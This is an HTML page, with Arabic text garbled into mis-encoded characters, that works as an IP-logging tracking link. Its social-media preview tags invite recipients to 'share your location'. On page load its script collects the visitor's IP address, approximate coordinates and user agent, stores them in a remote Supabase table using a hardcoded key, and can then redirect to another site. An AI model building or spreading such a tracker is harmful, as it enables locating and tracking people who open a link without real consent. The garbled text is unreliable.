<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ù…Ø´Ø§Ø±ÙƒØ© Ù…ÙˆÙ‚Ø¹ÙŠ</title>

  <!-- Open Graph Ù„Ù„ÙˆØ¢ØªØ³Ø§Ø¨/ØªÙ„ØºØ±Ø§Ù… -->
  <meta property="og:title" content="Ø´Ø§Ø±Ùƒ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø¢Ù† ğŸ“" />
  <meta property="og:description" content="Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø±Ø§Ø¨Ø· ÙˆØ³ÙŠØªÙ… ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§ (ØªÙ‚Ø±ÙŠØ¨ÙŠ Ø¹Ø¨Ø± Ø¹Ù†ÙˆØ§Ù† IP)." />
  <meta property="og:image" content="https://img.youm7.com/large/201704190111181118.jpg" />
  <meta property="og:url" content="https://xb7rbx.github.io/X/capture.html" />
  <meta property="og:type" content="website" />

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Ø´Ø§Ø±Ùƒ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø¢Ù† ğŸ“" />
  <meta name="twitter:description" content="ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ ØªÙ‚Ø±ÙŠØ¨ÙŠ Ø¹Ø¨Ø± Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù€ IP." />
  <meta name="twitter:image" content="https://img.youm7.com/large/201704190111181118.jpg" />

  <style>
    body{font-family:system-ui,-apple-system,Segoe UI;min-height:100svh;display:grid;place-items:center;padding:24px;line-height:1.7;background:#fafafa}
    .card{max-width:560px;width:100%;border:1px solid #e5e7eb;border-radius:14px;padding:22px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
    .muted{color:#6b7280}
    .ok{color:#047857;font-weight:700}
    .err{color:#b91c1c;font-weight:700}
    progress{width:100%}
    .hidden{display:none}
  </style>
</head>
<body>
  <div class="card">
    <h1>ğŸ“ ÙŠØªÙ… Ø§Ù„Ø¢Ù† ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹Ùƒ (ØªÙ‚Ø±ÙŠØ¨ÙŠ)â€¦</h1>
    <p class="muted">Ù„Ø§ Ø­Ø§Ø¬Ø© Ù„Ø¥Ø°Ù†Ø› Ù†Ø³ØªØ®Ø¯Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¹Ø¨Ø± Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù€ IP.</p>
    <progress id="bar" max="100" value="25"></progress>
    <p id="status" class="muted">Ø¬Ø§Ø±Ù Ø§Ù„Ø·Ù„Ø¨â€¦</p>
    <button id="retry" class="hidden">Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // Ù…ÙØ§ØªÙŠØ­ Ù…Ø´Ø±ÙˆØ¹Ùƒ
    const PROJECT_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
    const ANON_KEY    = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
    const TABLE       = 'pings';

    const supabase = window.supabase.createClient(PROJECT_URL, ANON_KEY);

    const bar = document.getElementById('bar');
    const statusEl = document.getElementById('status');
    const retryBtn = document.getElementById('retry');
    const qs = new URLSearchParams(location.search);
    const note = qs.get('note') || null;
    const redirect = qs.get('redirect') || null;

    function setStatus(t, c){ statusEl.textContent=t; statusEl.className=c||'muted'; }

    // Ù…Ø²ÙˆØ¯ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ø§Ù„Ù€ IP (Ø¨Ø¯ÙˆÙ† Ø¥Ø°Ù†)
    async function ipGeo(){
      const r = await fetch('https://ipapi.co/json/', {cache:'no-store'});
      if(!r.ok) throw new Error('IP geolocation failed');
      const j = await r.json();
      return {
        lat: j.latitude ?? null,
        lng: j.longitude ?? null,
        ip: j.ip ?? null,
        accuracy: 5000 // ~5 ÙƒÙ… ØªÙ‚Ø±ÙŠØ¨Ù‹Ø§
      };
    }

    async function save(row){
      const { error } = await supabase.from(TABLE).insert([row]);
      if (error) throw error;
    }

    async function start(){
      try{
        setStatus('Ø¬Ø§Ø±Ù Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ ØªÙ‚Ø±ÙŠØ¨ÙŠ Ø¹Ø¨Ø± IPâ€¦');
        bar.value = 60;

        const ua = navigator.userAgent;
        const info = await ipGeo();

        await save({
          lat: info.lat, lng: info.lng, accuracy: info.accuracy,
          ip: info.ip, ua, note, device_info: ua
        });

        bar.value = 100;
        setStatus('ØªÙ… Ø­ÙØ¸ Ù…ÙˆÙ‚Ø¹ ØªÙ‚Ø±ÙŠØ¨ÙŠ Ø¹Ø¨Ø± IP âœ…', 'ok');
        if(redirect){ setTimeout(()=>location.href=redirect,800); }
      }catch(e){
        setStatus('Ø®Ø·Ø£: '+e.message, 'err');
        retryBtn.classList.remove('hidden');
      }
    }

    retryBtn.addEventListener('click', ()=>{ retryBtn.classList.add('hidden'); setStatus('Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©â€¦'); start(); });
    start(); // ÙŠØ¨Ø¯Ø£ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§
  </script>
</body>
</html>
